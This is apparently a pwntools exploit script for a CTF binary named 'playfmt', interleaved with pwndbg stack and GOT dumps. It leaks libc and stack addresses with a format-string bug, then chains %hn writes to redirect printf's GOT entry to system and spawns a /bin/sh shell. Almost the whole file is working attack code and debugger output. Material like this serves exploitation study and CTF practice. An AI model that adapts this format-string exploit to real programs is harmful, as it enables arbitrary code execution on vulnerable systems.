#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.arch = 'i386'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process("./playfmt")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elf = ELF("./playfmt")

'''
Breakpoint *do_fmt+64
pwndbg> x/3s 0x804a060
0x804a060 <buf>:	"..%8$p....%6$p."...
0x804a06f <buf+15>:	".11111111"
0x804a079 <buf+25>:	""
pwndbg> stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x38252e2e ('..%8')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'
17:005c│      0xffa0781c ◂— 0x0
... ↓
'''
#  gdb.attach(io, "b *do_fmt+64\nc")
io.send("..%8$p....%6$p..11111111\0")
io.recvuntil("..")
libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['_IO_2_1_stdout_']
success("libc.address -> {:#x}".format(libc.address))
io.recvuntil("..")
stack = int(io.recvuntil("..", drop = True), 16) - 0x28
success("stack -> {:#x}".format(stack))
pause()

'''
pwndbg> x/3s 0x804a060
0x804a060 <buf>:	"%30684c%21$hn%1"...
0x804a06f <buf+15>:	"6c%22$hn2222222"...
0x804a07e <buf+30>:	"2"
pwndbg> stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x36303325 ('%306')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'
17:005c│      0xffa0781c ◂— 0x0
... ↓
'''
payload = "%{}c%{}$hn".format((stack + 0x1c) & 0xffff, 0x15)
#  payload += "%{}c%{}$hn".format((stack + 0x2c) & 0xffff - (stack + 0x1c) & 0xffff, 0x16)
payload += "%{}c%{}$hn".format(0x10, 0x16)
payload += '22222222\0'
info(payload)
io.sendafter("11111111", payload)
pause()

'''
pwndbg> x/3s 0x804a060
0x804a060 <buf>:	"%40976c%57$hn%2"...
0x804a06f <buf+15>:	"c%59$hn33333333"
0x804a07e <buf+30>:	""
pwndbg> stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x39303425 ('%409')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
17:005c│      0xffa0781c ◂— 0x0
... ↓
'''
#  gdb.attach(io, "b *do_fmt+64\nc")
payload = "%{}c%{}$hn".format(elf.got['printf'] & 0xffff, 0x39)
#  payload += "%{}c%{}$hn".format((elf.got['printf'] & 0xffff + 2) - (elf.got['printf'] & 0xffff), 0x3b)
payload += "%{}c%{}$hn".format(2, 0x3b)
payload += "33333333\0"
info(payload)
io.sendafter("22222222", payload)
pause()

'''
pwndbg> x/3s 0x804a060
0x804a060 <buf>:	"%211c%11$hhn%31"...
0x804a06f <buf+15>:	"325c%7$hn444444"...
0x804a07e <buf+30>:	"44"
pwndbg> stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d46930 (printf) ◂— call   0xf7e1dae9
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d46930
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
17:005c│      0xffa0781c ◂— 0x0
... ↓
pwndbg> n
0x08048540 in do_fmt ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────[ REGISTERS ]────────────────────────
 EAX  0x7b38
 EBX  0x0
 ECX  0xffa052a0 ◂— 0x20202020 ('    ')
 EDX  0xf7eb1870 (_IO_stdfile_1_lock) ◂— 0x0
 EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
 ESI  0x1
 EBP  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
 ESP  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
 EIP  0x8048540 (do_fmt+69) ◂— add    esp, 0x10
─────────────────────────[ DISASM ]──────────────────────────
   0x804853b <do_fmt+64>    call   printf@plt <0x80483a0>

 ► 0x8048540 <do_fmt+69>    add    esp, 0x10
   0x8048543 <do_fmt+72>    jmp    do_fmt+6 <0x8048501>
    ↓
   0x8048501 <do_fmt+6>     sub    esp, 4
   0x8048504 <do_fmt+9>     push   0xc8
   0x8048509 <do_fmt+14>    push   buf <0x804a060>
   0x804850e <do_fmt+19>    push   0
   0x8048510 <do_fmt+21>    call   read@plt <0x8048390>

   0x8048515 <do_fmt+26>    add    esp, 0x10
   0x8048518 <do_fmt+29>    sub    esp, 4
   0x804851b <do_fmt+32>    push   4
──────────────────────────[ STACK ]──────────────────────────
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
────────────────────────[ BACKTRACE ]────────────────────────
 ► f 0  8048540 do_fmt+69
   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16
   f 2 f7eb0d60 _IO_2_1_stdout_
   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18
   f 4 f7eb03dc __exit_funcs
   f 5 ffa07810
   f 6 f7d15276 __libc_start_main+246
pwndbg> stack 25
00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')
01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
02:0008│      0xffa077c8 ◂— 0x4
03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
09:0024│      0xffa077e4 ◂— 0x0
0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
0e:0038│      0xffa077f8 ◂— 0x0
0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
10:0040│      0xffa07800 ◂— 0x1
11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
12:0048│      0xffa07808 ◂— 0x0
13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
14:0050│      0xffa07810 ◂— 0x1
15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d37b30
16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
17:005c│      0xffa0781c ◂— 0x0
... ↓
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 6

[0x804a00c] read@GLIBC_2.0 -> 0xf7dd3c50 (read) ◂— cmp    dword ptr gs:[0xc], 0
[0x804a010] printf@GLIBC_2.0 -> 0xf7d37b30 (system) ◂— sub    esp, 0xc
[0x804a014] puts@GLIBC_2.0 -> 0xf7d5c870 (puts) ◂— push   ebp
[0x804a018] __libc_start_main@GLIBC_2.0 -> 0xf7d15180 (__libc_start_main) ◂— push   ebp
[0x804a01c] setvbuf@GLIBC_2.0 -> 0xf7d5cff0 (setvbuf) ◂— push   ebp
[0x804a020] strncmp@GLIBC_2.0 -> 0xf7e3a5d0 (__strncmp_sse4_2) ◂— push   ebp
'''
#  gdb.attach(io, "b *do_fmt+64\nc")
payload = "%{}c%{}$hhn".format(libc.sym['system'] >> 16 & 0xff, 0xb)
payload += "%{}c%{}$hn".format((libc.sym['system'] & 0xffff) - (libc.sym['system'] >> 16 & 0xff), 0x7)
payload += '44444444\0'
info(payload)
io.sendafter("33333333", payload)
pause()

io.sendafter("44444444", "/bin/sh\0")

io.interactive()
io.close()
